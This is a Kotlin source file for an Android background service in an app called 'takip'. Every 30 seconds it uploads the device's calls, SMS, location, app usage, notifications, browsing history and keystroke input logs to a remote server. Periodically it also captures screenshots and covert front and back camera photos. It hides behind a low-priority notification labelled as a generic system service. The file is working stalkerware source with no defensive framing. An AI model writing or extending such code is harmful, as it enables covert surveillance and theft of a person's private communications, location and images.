package com.takip.app.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.takip.app.R
import com.takip.app.api.ApiClient
import com.takip.app.collector.AppUsageCollector
import com.takip.app.collector.CallCollector
import com.takip.app.collector.CameraCaptureHelper
import com.takip.app.collector.LocationCollector
import com.takip.app.collector.SmsCollector
import com.takip.app.util.PrefsManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONArray
import java.io.File

class MonitoringService : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var syncJob: Job? = null
    private var mediaCounter = 0

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startForeground(NOTIFICATION_ID, createNotification())
        scope.launch { syncData() }
        startSyncLoop()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, createNotification())
        if (syncJob?.isActive != true) {
            scope.launch { syncData() }
            startSyncLoop()
        }
        return START_STICKY
    }

    override fun onDestroy() {
        syncJob?.cancel()
        scope.cancel()
        super.onDestroy()
    }

    private fun startSyncLoop() {
        syncJob?.cancel()
        syncJob = scope.launch {
            while (isActive) {
                delay(SYNC_INTERVAL_MS)
                syncData()
            }
        }
    }

    private suspend fun syncData() {
        ConfigManagerRefresh()
        val token = PrefsManager.deviceToken
        if (token.isNullOrBlank()) {
            Log.w(TAG, "Senkron atlandı: deviceToken yok")
            return
        }

        ApiClient.heartbeat(token).onFailure {
            Log.e(TAG, "Heartbeat başarısız: ${it.message}")
        }

        uploadArray(CallCollector.collect(this)) { ApiClient.uploadCalls(token, it) }.let { ok ->
            if (ok) CallCollector.commitSync()
        }

        uploadArray(SmsCollector.collect(this)) { ApiClient.uploadSms(token, it) }.let { ok ->
            if (ok) SmsCollector.commitSync()
        }

        uploadArray(LocationCollector.collect(this)) { ApiClient.uploadLocations(token, it) }
        uploadArray(AppUsageCollector.collect(this)) { ApiClient.uploadAppUsage(token, it) }

        val notifications = NotificationQueue.snapshot()
        if (uploadArray(notifications) { ApiClient.uploadNotifications(token, it) }) {
            NotificationQueue.clear()
        }

        val webHistory = ActivityLogQueue.snapshotWebHistory()
        if (uploadArray(webHistory) { ApiClient.uploadWebHistory(token, it) }) {
            ActivityLogQueue.clearWebHistory()
        }

        val inputLogs = ActivityLogQueue.snapshotInputLogs()
        if (uploadArray(inputLogs) { ApiClient.uploadInputLogs(token, it) }) {
            ActivityLogQueue.clearInputLogs()
        }

        captureAndUploadMedia(token)
    }

    private fun uploadArray(
        data: JSONArray,
        upload: (JSONArray) -> Result<Unit>
    ): Boolean {
        if (data.length() == 0) return false
        return upload(data).fold(
            onSuccess = {
                Log.d(TAG, "Yükleme OK (${data.length()} kayıt)")
                true
            },
            onFailure = {
                Log.e(TAG, "Yükleme hatası: ${it.message}")
                false
            }
        )
    }

    private fun ConfigManagerRefresh() {
        com.takip.app.util.ConfigManager.refreshIfStale()
    }

    private fun captureAndUploadMedia(token: String) {
        mediaCounter++
        if (mediaCounter % 3 != 0) return

        TakipAccessibilityService.instance?.takeScreenCapture { bytes ->
            if (bytes != null) {
                val file = File(cacheDir, "screen_${System.currentTimeMillis()}.jpg")
                file.writeBytes(bytes)
                ApiClient.uploadMedia(token, file, "screenshot")
                    .onFailure { Log.e(TAG, "Ekran yükleme hatası: ${it.message}") }
            }
        }

        CameraCaptureHelper.capturePhoto(this, useFrontCamera = false)?.let { file ->
            ApiClient.uploadMedia(token, file, "camera_back")
                .onFailure { Log.e(TAG, "Kamera arka hatası: ${it.message}") }
        }

        CameraCaptureHelper.capturePhoto(this, useFrontCamera = true)?.let { file ->
            ApiClient.uploadMedia(token, file, "camera_front")
                .onFailure { Log.e(TAG, "Kamera ön hatası: ${it.message}") }
        }
    }

    private fun createNotification(): Notification {
        val channelId = "takip_monitoring"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Sistem Servisi",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Arka plan servisi"
                setShowBadge(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle(getString(R.string.service_notification_title))
            .setContentText(getString(R.string.service_notification_text))
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    companion object {
        private const val TAG = "MonitoringService"
        private const val NOTIFICATION_ID = 1001
        private const val SYNC_INTERVAL_MS = 30_000L

        fun start(context: Context) {
            val intent = Intent(context, MonitoringService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }
}
